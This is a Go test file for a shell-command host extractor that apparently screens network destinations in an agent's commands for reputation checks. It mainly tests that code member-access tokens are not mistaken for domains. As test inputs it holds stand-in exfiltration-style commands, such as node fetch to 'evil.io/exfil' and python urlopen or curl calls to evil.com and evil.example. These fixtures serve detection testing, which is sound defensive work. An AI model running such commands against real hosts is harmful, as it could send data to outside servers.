package extract

import (
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

// These tests cover the inline-language-code URL-shape guard in the shell
// extractor (segmentIsInlineLangCode + inlineCodeInterpreters).
//
// The motivating false positive: a benign `python3 -c "..."` whose body
// contained ordinary member-access expressions (yaml.safe_load, x.id,
// c.name, r.result.data, m.read) had those dotted tokens extracted as
// candidate hostnames, because their right-hand labels (.safe .id .name
// .data .read) are all real ICANN-delegated gTLDs/ccTLDs and so pass the
// publicsuffix validity check in Normalize. With the API fail-closed and
// the request timing out, the whole command was denied.
//
// The guard requires explicit URL shape (scheme / userinfo / path) for
// matches inside a NON-shell language interpreter's inline-code segment,
// so member-access expressions are dropped while genuine URL-bearing
// network calls are still extracted. Shell interpreters (bash/sh -c) are
// excluded and keep the permissive pass (bare hosts are first-class shell
// arguments there).
func TestFromShell_InlineLangCode_URLShapeGuard(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "python -c with member-access dotted tokens (the reported FP)",
			command: `python3 -c "x = yaml.safe_load(f); print(x.id, c.name, r.result.data, m.read)"`,
			want:    nil,
		},
		{
			name:    "python -c with real URL still extracts",
			command: `python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com/x')"`,
			want:    []string{"evil.com"},
		},
		{
			name:    "node -e with fetch URL still extracts",
			command: `node -e "fetch('https://evil.io/exfil')"`,
			want:    []string{"evil.io"},
		},
		{
			name:    "node --eval long flag is recognized",
			command: `node --eval "const r = resp.data; fetch('https://evil.io')"`,
			want:    []string{"evil.io"},
		},
		{
			name:    "ruby -e member access suppressed",
			command: `ruby -e "puts obj.name; puts cfg.read"`,
			want:    nil,
		},
		{
			name:    "perl -e member access suppressed",
			command: `perl -e "print $x.id"`,
			want:    nil,
		},
		{
			name:    "php -r member access suppressed",
			command: `php -r "echo $resp.data;"`,
			want:    nil,
		},
		{
			name:    "sudo python3 -c still recognized via prefix-modifier walk",
			command: `sudo python3 -c "print(x.id)"`,
			want:    nil,
		},
		{
			name:    "python script path (no -c) is NOT treated as inline code",
			command: `python3 app.id`,
			want:    []string{"app.id"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(tc.want) == 0 {
				if len(got) != 0 {
					t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
				}
				return
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromShell_Heredoc_LangInterpreter covers heredoc bodies fed to a
// language interpreter (`python3 - <<'PY'`, `ruby <<RB`, ...). The body is
// source code, so member-access tokens whose right-hand label is a real
// gTLD/ccTLD (m.domains, x.id, resp.data, ...) must NOT be extracted, while
// genuine URL-bearing calls inside the body still are. This is the heredoc
// analog of the inline `-c` guard; splitSegments splits the body on
// newlines, so the fix must run ahead of segmentation (see processHeredocs).
func TestFromShell_Heredoc_LangInterpreter(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name: "python3 stdin heredoc with member access (the reported FP)",
			command: "cd /repo && python3 - <<'PY'\n" +
				"import yaml\n" +
				"cfg=yaml.safe_load(open(\"config.yml\"))[\"databricks\"]\n" +
				"x=next(r.result.data for r in rows)\n" +
				"COUNT_IF(NOT (a.domains <=> m.domains)) AS domains_diff\n" +
				"print(x.id, c.name, m.read)\n" +
				"PY",
			want: nil,
		},
		{
			name: "python3 heredoc with real URL in body still extracts",
			command: "python3 - <<'PY'\n" +
				"import urllib.request\n" +
				"urllib.request.urlopen('http://evil.com/x')\n" +
				"PY",
			want: []string{"evil.com"},
		},
		{
			name: "ruby heredoc member access suppressed",
			command: "ruby <<RB\n" +
				"puts obj.name\n" +
				"puts cfg.read\n" +
				"RB",
			want: nil,
		},
		{
			name: "node heredoc with fetch URL extracts",
			command: "node <<'JS'\n" +
				"const d = resp.data;\n" +
				"fetch('https://evil.io/exfil');\n" +
				"JS",
			want: []string{"evil.io"},
		},
		{
			name: "indented <<- heredoc delimiter is recognized",
			command: "python3 - <<-PY\n" +
				"\tval = record.name\n" +
				"\tPY",
			want: nil,
		},
		{
			name: "s3 bucket URI in heredoc body does not extract (no dotted host)",
			command: "python3 - <<'PY'\n" +
				"B=\"s3://malanta-ipinfo-updates-908027410712-us-east-1\"\n" +
				"PY",
			want: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(tc.want) == 0 {
				if len(got) != 0 {
					t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
				}
				return
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromShell_InlineLangCode_EnvAssignmentPrefix locks down that a bare
// shell env-assignment prefix (`PYTHONPATH=src python3 -c ...`,
// `FOO=bar python3 -c ...`) does not defeat the inline-code URL-shape guard.
// Before the segmentLeadingBin env-assignment walk, the leading bin
// classified as `pythonpath=src`, so the guard never fired and a bare domain
// literal inside the code (e.g. a CTI investigator's SQL `domain_name =
// "x.com"`) was extracted and denied even though the command only queries a
// data lake ABOUT the domain and never contacts it.
func TestFromShell_InlineLangCode_EnvAssignmentPrefix(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "PYTHONPATH prefix + bare domain literal in inline SQL (the reported FP)",
			command: `PYTHONPATH=src python3 -X utf8 -u -c 'sql="WHERE domain_name = \"phishing.example\" AND x=1"'`,
			want:    nil,
		},
		{
			name:    "multiple env assignments + bare domain",
			command: `A=1 B=2 python3 -c 'q="lookup evil.example here"'`,
			want:    nil,
		},
		{
			name:    "env prefix does NOT mask a real URL in the body",
			command: `PYTHONPATH=src python3 -c 'import requests; requests.get("http://phishing.example/x")'`,
			want:    []string{"phishing.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(tc.want) == 0 {
				if len(got) != 0 {
					t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
				}
				return
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromShell_CIDRLiteralsDropped locks down that CIDR network blocks are
// never extracted as if their network address were a host: the generic
// regex matches the leading IP and treats the prefix length as a spurious
// URL path, so without the looksLikeCIDR guard a CIDR literal — common in
// network-analysis code, SQL, and infra config — would be sent to the
// reputation provider as if it were a target host. This is a distinct
// concern from bare/URL IPv4 literals (see TestFromShell_IPv4Extracted),
// which ARE extracted now that a provider can answer IPv4 lookups.
func TestFromShell_CIDRLiteralsDropped(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{
			name: "CIDR literal in interpreter heredoc (the reported FP)",
			command: "cd /repo && .venv/bin/python -u - <<'PY'\n" +
				"print(\"rows in 198.51.100.0/22 at snapshot 12\")\n" +
				"PY",
		},
		{
			name:    "CIDR on a bare command line",
			command: "route add 10.20.30.0/24",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := FromShell(tc.command); len(got) != 0 {
				t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
			}
		})
	}
}

// TestFromShell_IPv4Extracted locks down that bare and URL-bearing public
// IPv4 literals ARE extracted (Malanta's /v1/ips/reputation endpoint can
// answer them again; see Normalize's doc-comment). Non-routable ranges
// stay dropped.
func TestFromShell_IPv4Extracted(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "bare public IPv4 to ping",
			command: "ping 192.0.2.8",
			want:    []string{"192.0.2.8"},
		},
		{
			name:    "URL to a public IPv4 host",
			command: "curl https://198.51.100.34/health",
			want:    []string{"198.51.100.34"},
		},
		{
			name:    "private IPv4 still dropped",
			command: "curl http://10.0.0.5/health",
			want:    nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(tc.want) == 0 {
				if len(got) != 0 {
					t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
				}
				return
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromShell_Heredoc_WrittenToSourceFile covers heredocs that write source
// code into a non-shell file (`cat > foo.py <<'PY'`, `tee h.js <<'JS'`). The
// body is source code, so member-access tokens whose right-hand label is a
// real gTLD (subprocess.run, resp.data) must NOT be extracted, while genuine
// URL-bearing calls still are. Shell-script targets (`> foo.sh`) keep the
// permissive pass.
func TestFromShell_Heredoc_WrittenToSourceFile(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name: "cat > foo.py heredoc with subprocess.run (the reported FP)",
			command: "cat > /tmp/dbsql.py <<'PY'\n" +
				"import subprocess, json\n" +
				"out=subprocess.run(cmd,capture_output=True).stdout\n" +
				"return json.loads(out)\n" +
				"PY",
			want: nil,
		},
		{
			name: "cat > foo.py heredoc with a real URL still extracts",
			command: "cat > /tmp/x.py <<'PY'\n" +
				"import urllib.request\n" +
				"urllib.request.urlopen('http://evil.example/x')\n" +
				"PY",
			want: []string{"evil.example"},
		},
		{
			name: "tee handler.js heredoc with member access suppressed",
			command: "tee /tmp/handler.js <<'JS'\n" +
				"const d = resp.data; obj.run();\n" +
				"JS",
			want: nil,
		},
		{
			name: "cat > setup.sh heredoc keeps permissive (bare host extracts)",
			command: "cat > /tmp/setup.sh <<'EOF'\n" +
				"curl evil.example\n" +
				"EOF",
			want: []string{"evil.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if len(tc.want) == 0 {
				if len(got) != 0 {
					t.Errorf("FromShell(%q) = %v, want no hosts", tc.command, got)
				}
				return
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// TestFromScriptFile_NonShellSourceRequiresURLShape verifies that following a
// non-shell source script (python) drops member-access tokens but still
// extracts a real URL — so a later `python3 /tmp/x.py` does not FP on
// subprocess.run the way the cat-write heredoc did.
func TestFromScriptFile_NonShellSourceRequiresURLShape(t *testing.T) {
	dir := t.TempDir()
	py := filepath.Join(dir, "run.py")
	body := "import subprocess\n" +
		"x = subprocess.run(['x']).stdout\n" +
		"import urllib.request\n" +
		"urllib.request.urlopen('https://evil.example/p')\n"
	if err := os.WriteFile(py, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got := FromShellInDir("python3 "+py, dir)
	want := []string{"evil.example"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("FromShellInDir(python3 %s) = %v, want %v", py, got, want)
	}
}

// TestFromShell_Heredoc_ShellNotGuarded locks down that a heredoc fed to a
// SHELL (bash/sh) keeps the permissive pass: a bare host in the body must
// still extract, because no separate beforeShellExecution event will fire
// for commands the shell body runs.
func TestFromShell_Heredoc_ShellNotGuarded(t *testing.T) {
	command := "bash <<'EOF'\n" +
		"ping example.com\n" +
		"curl evil.example/path\n" +
		"EOF"
	got := FromShell(command)
	want := []string{"example.com", "evil.example"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("FromShell(%q) = %v, want %v", command, got, want)
	}
}

// TestFromShell_ShellInlineCode_NotGuarded locks down that SHELL
// interpreters keep the permissive pass: a bare host inside `bash -c`/`sh -c`
// must still extract, because the inline body is a shell command line where
// the host is a first-class argument and no separate beforeShellExecution
// event will fire for it.
func TestFromShell_ShellInlineCode_NotGuarded(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "bash -c bare host still extracts",
			command: `bash -c "ping example.com"`,
			want:    []string{"example.com"},
		},
		{
			name:    "sh -c bare host still extracts",
			command: `sh -c "curl evil.example"`,
			want:    []string{"evil.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := FromShell(tc.command)
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("FromShell(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}
